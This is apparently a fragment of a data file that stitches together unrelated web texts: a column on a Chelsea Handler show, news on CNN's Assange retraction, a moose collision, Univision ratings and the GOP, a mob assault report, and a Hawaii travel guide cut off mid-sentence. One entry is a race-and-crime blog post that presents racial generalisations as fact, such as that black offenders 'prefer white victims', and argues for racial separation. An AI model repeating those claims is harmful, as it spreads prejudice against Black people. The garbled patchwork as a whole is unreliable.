hot air balloon filled with Mexicans and dump them on this side of the border just to piss him off. In other words, she’s sensitive to the plight of at least some minorities.\n\nBut when she talks to two young Central American food vendors, she admits, “I don’t like Asian guys. I’ve never dated them.” One of them volunteers that a couple weeks ago, she met an Asian guy and was shocked she was attracted to him. “I feel bad for Asian guys ’cause who is?!” Handler added, to laughs from both.\n\nHuh. So we’re supposed to feel for them when they’re sometimes stereotypically mistaken for maids, yet they’ve just stereotyped every Asian guy (except one so far) as unattractive? OK, you’re losing my empathy here.\n\nOn a drive around Los Angeles, Handler’s obese black friend Loni (no last name) says she’s never considered dating Asian men because they supposedly have small penises. Honey, small penises should be the least of your concerns.\n\nAnd of course, when it comes to racial jokes, Handler and her comic friends (including Margaret Cho) believe anything is fair game and as we saw, Handler will even defend attacks on three-year-old Asian kids who “asked for it.” Inevitably, it’s a bit incongruous.\n\n“Chelsea Does… Racism,” executive produced by Academy Award-nominated documentary filmmakers Morgan Neville (who won the Oscar for “Twenty Feet From Stardom”) and Eddie Schmidt, is available on Netflix.\n\nArigato Department: Thanks to fellow Rafu columnist Phil Shigekuni for asking me to speak at the annual installation of officers lunch for the San Fernando Valley JACL last Sunday. It was great meeting a bunch of progressive folks (and a surprising number originally from Hawaii!), talking to those I’ve met before, and seeing how invested they are in the way Asian Americans are portrayed in the media.\n\n’Til next time, keep your eyes and ears open.\n\n—\n\nGuy Aoki, co-founder of the Media Action Network for Asian Americans, writes from Glendale.

  "latent_15925": "During’s CNN’s show New Day, early Wednesday former CIA official Philip Mudd claimed that Wikileaks founder Julian Assange was “a pedophile who lives in the Ecuadorian embassy in London.” This statement came up during discussion about hacks against the Democratic National Committee, and possible involvement by the Russians. The actual accusation seems to have stemmed from an online dating site, toddandclare.com, that allegedly took shots at Assange as he was the greatest perceived enemy of the Clinton campaign for president of the United States.\n\nWikileaks responded by issuing instructions to have CNN sued for defamation if they did not “air a one hour expose of the plot” within 48 hours, as noted in a Twitter just after the on-air comments early Wednesday.\n\nCNN retracted the Tweet that contained the video, and posted an apology three hours later, which stated that “an analyst on [their] air earlier today asserted that Julian Assange was a pedophile, and regrets saying it. In fact, CNN has no evidence to support that assertion. Assange is currently wanted for extradition to Sweden to face sexual assault allegations there, and no evidence suggests that the women involved were minors. We regret the error.”\n\nIn response, a secondary account held by Wikileaks, called Wikileaks Task Force, posted on Twitter that CNN had made the apology and retracted the pedophilia accusation, but that they made “another two.” The link posted also makes reference to a website, justice4assange.com, which answers questions about the sexual assault cases that Assange has yet to be tried for.\n\nPresident-elect Donald Trump put out a series of tweets on the issue, saying Wednesday that “Julian Assange said ‘a 14-year old could have hacked Podesta’ — why was DNC so careless? Also said Russains did not give him the info!” After much media coverage on this tweet, he responded with two on Thursday morning, saying “the dishonest media likes saying that I am in Agreement with Julian Assange – wrong. I simply state what he states, it is for the people…. to make up their own minds as to the truth. The media lies to make it look like I am against “Intelligence” when in fact I am a big fan!”",
  "latent_16009": "Wild animals are beautiful. As long as we can observe them from afar. They’re dangerous when they run across roads and interstates, so slow the hell down. This moose was tagged by an SUV in Colorado near the Eagle’s Nest Wilderness off Highway 9 north of Vail and Breckenridge. The giant animal flies 10 feet in the air before landing and running away. “The car windshield was shattered and nearly broke through,” wrote Kayla Whitehead, who shot the video. The people in the car were OK. The moose left a skid mark of hair on the road and limped off slowly into the bushes.”\n\nFish and Wildlife officials followed the tracks of the battered animal and didn’t find a carcass so apparently, the animal survived. The car was mangled, though, with a broken windshield and crushed hood. Thankfully that was it. This is a busy stretch of highway for animals and the State is actually working on creating a highway overpass for wildlife so they can avoid the road and collisions like this.\n\nCollisions with animals on American roadways kill between 150 and 200 people annually. And what this driver did was actually the right thing to do. Many fatalities from animal collisions or interactions on roadways are caused when drivers swerve to miss the animals.",
  "latent_16043": "The Nielsen ratings for July are coming out soon and there are developing trends in television viewing that portend problems for Republicans. Variety is reporting that…\n\n“Univision is on pace to end the July sweeps in the numero uno spot, a milestone for the U.S. Hispanic network. Market leader expects to dominate July sweeps primetime among both Adults 18-49 and Adults 18-34 demos, in broadcast or cable.”\n\nTo be clear, this is not a ratings win among Hispanic networks or a particular genre of programming. It is the top spot for all television programming in the most important audience demographics. They beat ABC, CBS, NBC, and FOX.\n\nThe political significance of this victory is that it affirms the growth of the Latino market, which has already been recognized as the fastest growing segment of the electorate. After the GOP’s dismal showing among Latinos in last November’s election (Romney drew only 27%), the party made a very public case for examining what went wrong, producing a thick document they called an “autopsy.” They concluded that the party “must embrace and champion comprehensive immigration reform. If we do not, our Party’s appeal will continue to shrink to its core constituencies only.”\n\nFast forward to July 2013. The Senate passed a comprehensive immigration reform bill with the votes of every Democrat, but only 14 Republicans. And now the bill sits dormant in the House where the Republican leadership refuses to bring it up for a vote. Many Republicans are openly hostile to immigration reform and have vowed to obstruct any attempt to advance it. Additionally, Republicans back voter suppression schemes that negatively impact Hispanic citizens. They also oppose the Dream Act that allows certain undocumented residents to remain in the country if they were brought here as children, have no criminal record, and are enrolled in either school or the military.\n\nSo despite recognition that the Republican Party’s viability in the future depends on broadening their base and appealing to Hispanics, they are doing virtually everything they can think of to alienate and insult the Latino community.\n\nAnother segment of the electorate that the GOP has had problems with are young voters. President Obama got a whopping 67% of the youth vote last November. Some of the issues that are important to this demographic include marriage equality, gun safety, tax fairness, health care, student loan interest rates, ballot access, and reproductive rights. These are all issues that the GOP polls poorly on among young constituents. Their autopsy noted that many respondents viewed the GOP as the party of “stuffy old men,” and acknowledged that “If our Party is not welcoming and inclusive, young people and increasingly other voters will continue to tune us out.”\n\nBack to the present, we see that Republicans have done virtually nothing to avert the catastrophes they themselves predicted. And another signal in the media illustrates just how far afield they are in addressing the concerns of young citizens. The New York Times reports that Fox News, the PR arm of the GOP, is increasingly an island of far-right, senior citizens:\n\n“[F]or six of the last eight years, Fox News has had a median age of 65-plus and the number of viewers in the 25-54 year old group has been falling consistently, down five years in a row in prime time.”\n\nThis represents the highest median age of any television network. Hence all the ads for Cialis, reverse mortgages, and the Scooter Store. Fox also has the widest disparity between viewers 18-34 and those 25-54. MSNBC, which has been slumping lately, still manages to grab the top spot for for viewers 18-34 in primetime.\n\nRepublicans, and their preferred media, are bleeding supporters in key groups that they have already conceded are essential for future victories. Hispanics, youth, African-Americans, and women, are all growing constituencies. But they are being left behind by an increasingly extremist and narrow Republican Party that is only responsive to older, white, Tea Partiers.\n\nWhile this trend surely portends trouble for the GOP, it is an opportunity for Democrats to show some real leadership and embrace the diversity for which the party is known. Democrats have an uphill battle in 2014 due to gerrymandered redistricting by the GOP. They have to outperform Republicans by 7% just to stay competitive. Consequently, now would be the time to start shoring up support for the faster growing and more populous voter groups that show the most promise for electoral gains. Let the GOP have have the white, senior wingnuts. After all, it’s all they have left.",
  "latent_16049": "Continuing with our discussion of Leuconoe’s questions, today we’re finally going to dive into Poverty, not race, tied to high crime rates in urban communities, Homicide in Black and White (pdf,) and Nazis Can’t Do Math: Reflections on Racism, Crime and the Illiteracy of Right-Wing Statistical Analysis.\n\nI want to begin with a quick note on the nature and effects of crime. Tim Wise, in particular, is highly dismissive of white concerns about black crime, noting that your actual chances of getting murdered by a black person are pretty low (American homicide rates: high when they want to ban guns, low when someone points out the racial composition of murderers.)\n\nBut Wise’s focus on homicide trivializes all of the smaller, far more frequent crimes that people are also trying to avoid, like robbery, arson, carjacking, assault, rape, etc. These crimes are thankfully less severe than murder, but they are still horrible.\n\nI am going to share a personal story. A friend’s house was recently robbed. The police received a call from her home alarm, they called her, and she called me to be with her when she got home.\n\nWhy me? I live nearby, and she basically has no one else besides her kids–her husband was arrested some time ago for domestic violence and the rest of her family lives across the country. And here was her house–the back windows shattered, glass everywhere, her things scattered everywhere. She collapsed, sobbing and afraid. Why would someone do this? What could she tell her kids? How could they stay in this house, which now had holes instead of windows?\n\nNote: I do not know the race/s of the robbers. This anecdote is not about race. It is about the pain crime causes. It is about a neighbor who has always been kind to me. Tim Wise only looks at homicide, completely neglecting the many other crimes people commit. But crime is not trivial. Robbery is not trivial. Home invasion is not trivial. Once someone has suffered like this, if they can move, there is a good chance they will. Personally, I hate all crime, but this post is specifically in response to questions about black vs. white crime rates and black-on-white crime.\n\nWhat are a white person’s chances of being the victim of a violent crime if they live in a black neighborhood? Luckily for us, La Griffe du Lion has already calculated the answer:\n\n“John” is just a name La Griffe has assigned to his hypothetical white person.\n\nLa Griffe du Lion explains both the math and statistics he used to create these graphs in extensive detail, so if, like Tim Wise, you doubt his ability to do math, (though I must note that La Griffe is probably not a Nazi,) you can go double-check his work. Besides, I strongly recommend the article, if you haven’t read it already.\n\nBy contrast, Tim Wise claims:\n\nSo if the data say, and they do, that less than seven-tenths of one percent (0.7 percent) of blacks will violently victimize a white person this year and that only about one-quarter of one percent (0.25 percent) of all whites will be violently victimized by a black person this year, that isn’t what matters. … That these incidents — awful though they are — do not a social trend make, seems to escape some people. … After all, for every one of these violent crimes committed against a white person by a black person, there will be at least 4 such crimes committed against whites by other whites. And yet, racists never seem to think much of this; they don’t assume that white criminals represent white America generally, or that their depredations against their fellow whites say anything about the inherent pathologies of their white brothers and sisters.\n\nI mean, there really isn’t a pattern here. It’s just a bunch of dots. I don’t know why anyone would think there is a connection between blacks and crime.\n\nLet’s return to La Griffe du Lion:\n\nThe data reveal two causes of white victimization by blacks. First, a black is 3 times more likely than a white to commit violent crime. However, as a neighborhood turns black, this factor could increase black-on-white violence at most by a factor of 3, and then only when a neighborhood is virtually all black. The observed level of white victimization is much too high to blame on general tendencies of blacks to be violent. A more important reason is simply that blacks prefer white victims. The best and most complete evidence comes from the Justice Department. Its annual National Crime Victimization Survey (NCVS) canvasses a representative sample of about 80,000 Americans, from roughly 43,000 households. From this survey, a picture of crime is painted by its victims. The last full report of the NCVS was issued in 1994. From it we learn that blacks committed 1,600,951 violent crimes against whites. In the same year, whites committed 165,345 such offenses against blacks. Despite being only 13 percent of the population, blacks committed more than 90 percent of the violent interracial crime. Less than 15 percent of these had robbery as a motive. The rest were assaults and rapes. The asymmetry of interracial crime goes still deeper. More than half the violence committed by blacks is directed against whites, 57 percent in 1994. Less than 3 percent of the violence committed by whites is directed against blacks. Population and NCVS statistics reveal that in 1994 a black was 64 times more likely to attack a white than vice versa. In the city, the races live mostly apart from one another, so that the most convenient victims of thugs are others of the same race. Only a hunter’s mentality could account for the data. Given a choice, a black thug will select a white victim. Ironically, so will a white thug.\n\nI’m just going to re-post one of yesterday’s graphs:\n\nThat said, Wise does make one good point:\n\nAnd although interracial homicide in either direction is quite rare, the fact is, any given black person in the U.S. is almost three times as likely to be murdered by a white person as any given white person is to be murdered by someone who is black.\n\nThere are, as you may have noticed, more white people than black people in this country. If 10% of whites commit crimes against blacks, and 10% of blacks commit crimes against whites, then a lot more black people will be victimized by whites than whites will be victimized by whites. But since there are a lot more whites than blacks, a black person’s chances of being victimized by any particular white, and a white person’s chances of being victimized by any particular black, are exactly the same.\n\nWise is correct, and this reality is probably quite distressing to black people, who of course don’t like being crime victims any more than anyone else. In the real world, being a minority matters in many ways. But from an HBD perspective, it’s irrelevant–it’s just an effect of the sizes of the populations, not some intrinsic feature of the people involved–and the solution, if you want to solve it, is just to keep whites away from blacks. (Which seems to be the opposite of what Wise desires.)\n\nAdditionally, Wise notes simultaneously that whites avoid black neighborhoods (the much-reviled “white flight”) and that whites are not often victimized by black people.\n\nWell DUH. That’s because they’re avoiding black neighborhoods. Whites in high-crime neighborhoods (of any race, obviously) are likely to be victimized.\n\nIt’s like when people ask why we’re incarcerating so many people even though crime rates have fallen. They have fallen because the criminals are in prison.\n\nI tried to look up Tim Wise’s address, because the ultimate test of whether he believes what he preaches is whether or not he lives in a poor black neighborhood, but couldn’t find it. I found some posts where people claimed to have his address, but when I popped those addresses into the county tax assessor’s website, found that the property belonged to a totally different person who is probably really annoyed at all of the hate mail they receive. (I don’t blame Tim Wise for not wanting his address to be easily findable on the internet. He, too, would like to avoid violent crime.)\n\nOkay, enough of Tim Wise. You can agree with his numbers, or you can agree with La Griffe’s. Either way, I don’t think anyone wants to live in a high-crime neighborhood.\n\nTo be continued…\n\nAdvertisements",

The entire attack was caught on video.The two victims, ages 20 and 21, were attacked Sunday morning on Craft Street in Winton Terrace.Watch this story | Victims speak out after Winton Terrace attackIn the video, the sisters are seen stripped naked and kicked and punched in the courtyard of an apartment building, while others stand by.“I feared for my life,” the 21-year-old victim said. “I just thought I was going to die right there on that ground.\"A viewer emailed the video of the attack to WLWT News 5. It has also been posted and shared on Facebook.“You see the video of two females getting stripped down naked, basically humiliated out there and beat to a pulp,” Detective Tracy Jones said.Officers said one victim was beaten so badly that she had to be hospitalized for possible internal injuries.“It looked real vicious,” one witness said. “It was kind of horrific, actually.”Thursday, torn clothing was still in the spot where the attack happened.“As you can imagine from the video, they have significant bruising about their face and body. They felt like they had been humiliated out there in public,” Jones said.One witness described the scene as mob mentality.“It was disturbing and scary,” she said.The hospitalized victim has since been released.“It is very brutal,” Jones said. “As a police department, we don’t stand for that. We're trying to get these people into custody as soon as we can.”Police arrested Kianna McMeans, 25, and charged her with two counts of aggravated robbery. They also issued an arrest warrant for Jakeda Phillips, 25.“They didn't care if they killed us, the way they were stomping my sister in the head,” the 20-year-old victim said. “They didn't care what happened after that.\"Investigators said the attack happened while the sisters were spending the night at McMeans' apartment after a night at a club. The sisters said they awoke to several women beating them.“I was very, very, very humiliated that I was out there without no clothes on and everybody was just standing there looking at me. Nobody would give me a telephone to use,” the 20-year-old victim said.According to a police report, the victims told police McMeans let the attackers into the apartment to rob them.“All the girls started punching me in my face and pulling my hair. They dragged me down to the ground and ripped my dress off of me and dragged me out of the house and beat me and kicked me in my face,” the 20-year-old victim said.The victims told police McMeans was assaulted at the club and she accused the victims of not helping her during the assault.The report stated that the group of women stole the sisters' cellphones, purses and wallets, valued at $1,100.According to court documents, officers found the stolen property in McMeans' car.Jones said the Winton Terrace community had been helpful identifying the women involved and police hope to receive more information about the attack.McMeans will be arraigned in Hamilton County Court Friday morning.",

Situated nearly at the center of the north Pacific Ocean, Hawaii marks the northeast corner of Polynesia. While it was once a major hub for the whaling, sugar and pineapple industries, it is now economically dependent on tourism and the U.S. military. The natural beauty of the islands continues to be one of Hawaii's greatest assets. Honolulu is the state's capital, largest city, and cultural hub. Hawaiian and English are the official languages of Hawaii.\n\nIslands [ edit ]\n\nMap of Hawaii\n\nHawaii is a landlock of over nineteen distinct volcanic islands located over a geological \"hot spot\" in the Central Pacific. The Pacific plate on which the islands ride moves to the northwest, so in general the islands are older and bigger(due to erosion) as you move from southeast to northwest. There are eight major islands, six of which are open to tourism.\n\nHawaii (Hawaiʻi) – called the Big Island to avoid confusion – is the biggest of the islands and home to Mauna Kea, Mauna Loa (the largest and one of the most active volcanoes on Earth), Hawaii Volcanoes National Park [2], coffee and macadamia nut plantations, working ranches, and even green sand beaches which is very good for swimming. Kailua-Kona is the busiest part of the island on the drier, leeward side, and near the mega-resort Kohala Coast area with nearly zero annual precipitation. The saddle road (quite passable and a must see--despite what rental car companies say) passes between the massive volcanoes and connects Kohala with Hilo, the largest town on the windward side with annual precipitation of more than 180 inches per year. Unlike anywhere else on Earth and definitely worth a look.\n\nOahu (Oʻahu), nicknamed \"the Gathering Place,\" is the most famous and developed island. Its southern shore is home to the city of Honolulu, the state capital and largest city; four out of every five kama'aina (Hawaii residents) call it home. It is the governmental and commercial center of the state, and Waikiki Beach is arguably the best known tourist destination in Hawaii. Outside the city are pineapple fields, and the North Shore of Oahu, which is known each winter as the home of some of the largest waves in the world. The USS Arizona National Memorial at Pearl Harbor is also very popular visitor destination.\n\nMaui is the second biggest island in the chain and is home to 10,023 foot (3,055 m) tall volcanic mountain crater of Haleakala. It is nicknamed \"the Valley Isle\" for the narrow plain between Haleakala and the West Maui mountains. On the west side of the island are the resort areas of Lahaina, Kaanapali and Kapalua, while the south side is home to Kihei, and Wailea. On the east side is the tiny village of Hana, reached by one of the most winding and beautiful roads in the world.\n\nKauai (Kauaʻi), the \"Garden Isle,\" is home to several natural wonders, such as the Wailua River, Waimea Canyon, and the Na Pali Coast. Mount Waialeale is known as one of the rainiest spots in the world.\n\nMolokai (Molokaʻi), the \"Friendly Isle,\" is one of the least developed islands in the chain. It is home to Kalaupapa, the leper colony on Molokai's north shore that was the home of Father Damien.\n\nLanai (Lānaʻi) was at one time completely owned by Dole Foods and was the largest pineapple plantation in the world; it is now home to several exclusive resorts.\n\nNiihau (Niʻihau) is a privately owned island with an entirely Native Hawaiian population. Until very recently, the island was off limits to all but family members and invited guests of the owners. Tourism to the island is limited to helicopter, ATV, and hunting excursions originating on Kauai.\n\nKahoolawe (Kahoʻolawe), which was once a former U.S. Navy bombing range, remains uninhabited. Efforts are being made to rehabilitate the island, but cleanup efforts continue.\n\nCities [ edit ]\n\nHonolulu - state capital and most-populous city\n\n- state capital and most-populous city Kahuku - on Oahu\n\nKailua - on Oahu\n\nLihue (Hawaiian: Līhuʻe ) - on Kauai\n\n) - on Kauai Lahaina (Hawaiian: Lāhainā ) - on Maui\n\n) - on Maui Kahului - on Maui\n\nWailuku - on Maui\n\nHilo - largest city on the Big Island\n\nKailua-Kona - on the Big Island\n\nOther Destinations [ edit ]\n\nUnderstand [ edit ]\n\nThe name game\n\nThe reef triggerfish (Rhinecanthus rectangulus), the state fish of Hawaii, is known in the Hawaiian language as the humu­humu­nuku­nuku­āpuaʻa, which means \"triggerfish with a snout like a pig\". It is not the longest Hawaiian fish name, as is often thought; that distinction instead goes to the lauwiliwilinukunukuʻoiʻoi (\"long-snouted fish shaped like a wiliwili leaf\"), the butterflyfish (Forcipiger longirostris).\n\nWhere tourism is concerned, Hawaii has something for everyone. The island of Oahu, the most populous and home to the state capital and largest city of Honolulu, is great for people who wish to experience the islands and still keep the conveniences of a large city. Rainforests and hiking trails are located just minutes from Waikiki Beach, one of the world's best tourist destinations. In the winter, large waves on Oahu's north shore turn the normally sleepy area into the surfing capital of the world.\n\nOn the other hand, those who wish to experience Hawaii at a slower pace would do well to visit one of the Neighbor Islands (the other, less populated islands around Oahu). All the neighbor islands offer opportunities to relax and enjoy the sun and scenery. Many of the natural wonders of the Islands are located on the Neighbor Islands, from Waimea Canyon on Kauai, to Haleakala on Maui, to Hawaii Volcanoes National Park on the Big Island of Hawaii. Numerous waterfalls and rainforests evoke memories of what the islands might have looked like before major corporations set their sights on Hawaii. The road to Hana is one of the most scenic on Maui, as you manipulate many turns overlooking the Eastern coast of the island. It leads you over bridges and past beautiful waterfalls. Ultimately, you can end up at the Oheo Gulch Pools (which are not sacred and there's more than seven, but are also known by the name of Seven Sacred Pools), where the hiking is quite the experience.\n\nHistory [ edit ]\n\nFather Damien\n\nOn 11 October 2009, Father Damien de Veuster (1840-1889), a Belgian priest who came to the island of Molokai in 1864 to treat victims of leprosy - and eventually succumbed to the disease - was canonized by Pope Benedict XVI.\n\nPolynesians migrated to, and established communities on, the islands of Hawaii before the arrival of Captain James Cook in 1778, who is widely credited as the first European visitor to the islands. At that time, each island was a separate kingdom. With the support of western advisors and weapons, Kamehameha I of the island of Hawaii conquered all the islands except Kauai, which acquiesced to his rule in 1810.\n\nAfter Kamehameha II abolished the kapu (taboo) system, American missionaries came to the islands to spread Christianity, and quickly began establishing imperial enterprise and amassing political power on the islands. Their children would later become successful businessmen in the Islands and still own entire islands to this day. Pineapple and sugar cane plantations were established, and workers from other countries (in particular Japan, the Philippines, China, and Korea) were imported as contract laborers. Later, their descendants would also become established as successful professionals.\n\nThe Hawaiian monarchy was overthrown in 1893 by a group of American businessmen. While the U.S. administration at the time refused to annex the former sovereign nation, in 1898 the United States did annex the islands, which became a territory in 1900, and a state of the United States in 1959.\n\nHawaii also became an important outpost for the U.S. military through the 20th century, and Pearl Harbor was the site of the Japanese attack on December 7, 1941, that resulted in the U.S. joining World War II. Today, the military maintains its presence here, with several major military bases on the island of Oahu alone; Pearl Harbor remains the headquarters of the U.S. Pacific Fleet.\n\nOver the years, many major retail chains have expanded their presence in Hawaii, making the Islands look more and more like the continental United States, often at the expense of local businesses. Nevertheless, Hawaii remains culturally vibrant. Its population, descended from the Native Hawaiians, the original plantation workers, and more recent arrivals, and in which no one group has a majority, is often cited as an example of multiculturalism at its best. There is a strong commitment to perpetuating native Hawaiian cultural traditions, as well as the cultural heritage of Hawaii's many immigrant communities from the Pacific, Asia and Europe. And certainly the environment is conducive to longevity...Hawaii has the longest predicted life expectancies of any U.S. state.\n\nWeather [ edit ]\n\nDepending on where you're located in Hawaii, the weather can be very different over even short distances. On the same day, on Oahu you might find sun over the beaches in Waikiki and rain only a few miles away in Manoa Valley.\n\nAlthough the islands receive abundant amounts of both sunshine and rain, rain is more likely on the north and east sides of the islands, which face the prevailing northeasterly tradewinds (the \"windward\" side of the island), as well as the mountain peaks and valleys. The moist tropical air carried by the tradewinds is forced upward by the mountains, resulting in clouds and rain. Rain is less likely on the coastal areas of the \"leeward\" sides (the south and west sides) of the islands.\n\nAlthough there are no true \"seasons\" in the islands in the same sense as the rest of the U.S., the climate does go through annual cycles based on rainfall. The \"wet\" season in Hawaii (cooler temperatures and more rainfall) runs roughly from October to March, and the \"dry\" season (warmer temperatures and less rainfall) from April to September. There is therefore a higher probability of rain if you visit during the peak of tourist season in late December or January.\n\nHurricane season in the islands runs from June to November. Although Hawaii's relative isolation means that it is affected only rarely by tropical cyclones, a destructive storm will occasionally hit the Islands, such as Hurricanes Iwa and Iniki hitting Kauai in 1982 and 1992 respectively.\n\nOverall, Hawaii is warm and balmy — when you step out of the plane you'll immediately notice that the air is soft and humid — and during the summer months the tradewinds provide a pleasant breeze. Daytime temperatures generally range from the low 80s (27°C) in \"winter\" to the high 80s (31°C) in \"summer\". Very rarely does the air temperature exceed 90°F (32°C) even in the hottest part of summer; however, the humidity will make it feel as if it were a few degrees hotter. Ocean temperatures range between 77°F (25°C) degrees in the winter to 82°F (28°C) in the summer. There is usually no more than a 20°F (12°C) difference between daytime high and nighttime low temperatures.\n\nConsequently, besides your driver's license, credit card, camera, binoculars, and other essentials, it's best to keep your clothes to a minimum... a jacket, sweater, one or two pair of washable slacks/shorts, walking shoes, sandals and swim gear. Sunscreen is essential since Hawaii's close proximity to the Equator translates into very strong sun radiation. The suitcase space you save can be used to fill up on island purchases.\n\nGet in [ edit ]\n\nForeign travelers entering Hawaii directly from another country are subject to the same entry requirements as for the United States in general. See the Get in section of the United States article.\n\nAs Hawaii is one of the 50 United States, flights to Hawaii from the U.S. Mainland (that is, all of the U.S. outside of the state) are considered domestic flights. Therefore, it is not necessary for U.S. citizens or legal immigrants to show a passport (or any documentation of U.S. citizenship or immigration status) when entering Hawaii from the U.S. Mainland. It is also not necessary for foreign visitors arriving from the U.S. Mainland to show passports or visas (U.S. entry formalities are done at the port of entry).\n\nYou will, however, be asked to fill out a written agricultural declaration while aboard your flight to Hawaii. This declaration is required by the U.S. and Hawaii state departments of agriculture to prevent harmful plant pests and diseases from coming into Hawaii. Any fresh fruits, vegetables, flowers, and the like need to be declared and inspected by Department of Agriculture personnel at your port of arrival; some items may be prohibited from entering Hawaii at all. Penalties for non-compliance are stiff. Avoid bringing such items with you if at all possible. It's not worth the hassle. (On the reverse side of this declaration is a Hawaii Tourism Authority questionnaire that asks for information about your stay. You are encouraged but not required to complete this questionnaire.) Be sure to bring a pen on your inbound flight to Hawaii.\n\nWhen leaving Hawaii for the U.S. Mainland, all baggage must be inspected by U.S. Department of Agriculture inspectors at the airport. Be advised that fresh fruits (with the exception of pineapples and treated papayas) are prohibited from leaving the islands to prevent the spread of fruit flies. Consult the U.S. Department of Agriculture for more details. Bags are inspected by X-ray, so depending on the airport you leave from and the airline, be prepared to submit to as many as three checkpoints on the way to your Mainland flight: having your checked bags X-rayed in the ticket lobby, the TSA security checkpoint, and perhaps a separate agricultural inspection for your carry-on bags on the way to your gate.\n\nHawaii does not observe Daylight Saving Time. For reference, Hawaii is two time zones behind the U.S. West Coast, thereby accounting for a three hour time difference during DST. Arizona, which also does not observe DST save for the Navajo Reservation, is always three hours ahead of Hawaii year-round.\n\nBy plane [ edit ]\n\nMost flights from the mainland US and almost all international flights land in Honolulu on the island of Oahu. From here, passengers destined for a Neighbor Island will connect to an interisland flight (see By Plane in Get Around below). Direct service from the mainland is also available to Kahului on Maui, Kona and Hilo on the Big Island, and Lihue on Kauai as well.\n\nDepending on the airline, nonstop flights to Honolulu leave from most major gateway airports on the West Coast (as well as some smaller ones), as well as many major airports in the Midwest and East Coast. The flight from Los Angeles or San Francisco takes about 5 hours, comparable to a flight between the West and East Coasts. Thus, a flight from New York can take about 10.5 hours. Foreign carriers such as Korean, Philippine Airlines, Asiana, Japan Airlines, etc. cannot sell tickets just to Hawaii from the mainland but they can if originating from outside the United States or to passengers who are ticketed for onward travel (usually to Asia, Australia, New Zealand or elsewhere in the South Pacific) from the mainland as a stopover for free or for an extra fare.\n\nJetstar [3] is a budget Australian airline that recently started connecting Honolulu to several cities in Australia. Also Hawaiian Airlines, United, Delta and several other carriers have several direct flights to Honolulu from Canada, Japan, South Korea, China, Taiwan, The Philippines, Australia, and New Zealand.\n\nBy boat [ edit ]\n\nWhile the days where everyone arrived in Hawaii by boat are long gone, there are limited numbers of trans-Pacific cruises to Hawaii that leave from ports on the West Coast. However, one fascinating way to experience Hawaii is by taking a cruise ship between the islands (see Get around: By boat).\n\nThere are limited freighter services [4], but if you are an American citizen embarking in the USA and wishing to travel to Hawaii then you cannot travel this way (because of the U.S. Passenger Vessel Services Act of 1886, which says foreign-flagged ships cannot carry passengers from one U.S. port to another unless they stop in a foreign country - try cruises from Ensenada, Baja California or Vancouver, British Columbia).\n\nInternational Charter Group: [5]. Yacht charter and sailing, one of the worlds largest acht charter companies, can take care of all charter requirements, from bareboat to crewed in Hawaii. Operating from nine offices worldwide (USA, Spain, UK, Germany, Italy, France, Spain, Switzerland, Caribbean, Hong Kong and Dubai).\n\nGet around [ edit ]\n\nBy plane [ edit ]\n\nBecause Hawaii is an archipelago, air travel is, by and large, compulsory for traveling within the state. Travelers can choose from either a scheduled or unscheduled air carrier. Both scheduled and unscheduled air carriers are regulated by the Federal Aviation Administration via the states local Flight Standards District Office.\n\nSix scheduled inter-island air carriers, Hawaiian Airlines [6], Mokulele Airlines [7], provide set scheduled flights between the islands. Travelers can save money and time by planning \"triangle routes\" that arrive in Hawaii on one island and leave on another.\n\nScheduled flight times run anywhere from 20 minutes to one hour and can usually be purchased a day or two before departure, although this may increase the cost of traveling.\n\nVisitors wanting to fly according to their own demand (as opposed to a pre- set published times) should consider flying on an unscheduled air carrier also known as air taxi service. Passengers can simply contact the air carrier direct and arrange a time and place for pick up. Iolani Air [8] is one such air carrier. Big Island Air [9] is another.\n\nThe Hawaiian islands are populated with airstrips that some carriers choose not to service due to economic or operation considerations that make flights not feasible. In some instances air taxi companies may be the only means of reaching a certain location or air strip.\n\nHunters and campers with cumbersome gear planning trips to remote island regions and also visitors wishing to \"island hop\", should consider air taxi service to meet their demands.\n\nBy boat [ edit ]\n\nCharter boats sail and motor between some islands, especially the Maui-Molokai-Lanai area. But, crossing the channels between islands can be extremely rough going. Because of this, a few charter companies specialize in having boats delivered inter island and can meet you at your destination.\n\nNorwegian Cruise Lines operates both U.S.-flagged and foreign flagged cruise ships between the islands. By February 2007 Maui departures are being eliminated, leaving Honolulu Harbor as the sole originating port. The ship is called Pride of America.\n\nBy bus [ edit ]\n\nOn Oahu there is an excellent public transportation system on the \"The Bus\" for travel between Honolulu, Waikiki, Makaha, Schofield Barracks and around the island. You can buy a booklet called \"TheBus\" at local ABC Stores [10] giving route information on how to get around the island. Route Schedules are also available on The Bus Website [11].\n\nThe other islands are rural and offer limited bus services. The available bus services operate within and between populated areas are:\n\nHele-On (Hilo, Kona, Waimea and around the big island of Hawai'i)\n\n(Hilo, Kona, Waimea and around the big island of Hawai'i) Kaua'i Bus (Kauai)\n\n(Kauai) Maui Bus (Kahului, Wailuku, Lahaina, and other places in western Maui. No service to the Haleakala NP on the eastern part of the island).\n\nNo regular bus services on Molokai or Lanai.\n\nBy car [ edit ]\n\nIf you want to take your car to Hawaii, it will either need to be amphibious or freighted by ship, making this infeasible unless you plan a long-term stay in Hawaii. However, Hawaii is the only state that honors all other U.S. state vehicle licenses until they expire, provided you apply for a permit within 10 days of the car's arrival. (Incidentally, Hawaii is also the only state that does not require intended residents to exchange their out-of-state driver's licenses.) Hawaii Car Rental.\n\nCar rentals should be booked as soon as possible as the price charged is based on a supply/demand basis. The exception is Waikiki where you will not need a car on a permanent basis so just rent a car the day before you want one. Collision insurance coverage is very expensive through car rental companies (it can easily double your daily rate or more). Consider using a credit card with collision coverage. All U.S.-issued consumer Visa credit (but not debit) cards, many MasterCard cards and some American Express cards include secondary collision coverage; some American Express, Visa business and Diners Club cards offer primary coverage. Alternatively or additionally, prior to your trip, verify that both collision and liability (also called third-party) coverage from your own auto insurance company extends to rental cars. Car rental rates for 5- or 6-day periods are often the same as 7-day rentals. Use a credit card that includes medical and trip cancellation insurance benefits; if you cannot, consider buying trip insurance from your flight travel agent. Also be aware some hotels may charge you for car parking; check with your hotel for parking fee before you book your car. International tourists with non U.S. credit cards are not covered by the above. By clicking on your country of origin when obtaining a quote from the car rental company's website, often an inclusive quote with loss damage waiver and supplemental liability insurance is provided. Otherwise using a travel agent website within your country e.g. your local Expedia website or local car hire broker will often also include insurance in their quote.\n\nGasoline, while nowhere near the prices charged in Europe, is significantly more expensive in Hawaii than on the Mainland. Expect to pay about 10% more than the prevailing rate on the Mainland for gasoline in Honolulu. Neighbor Island prices can be as much as 10-15% above that.\n\nBe aware that outside of the major highways (H1, H2 and H3) most locals refer to the roads not by number but by name, and will likely not understand if you ask for a road by number. For example you would never hear someone refer to Kalanianiole highway as \"route 72\" or \"highway 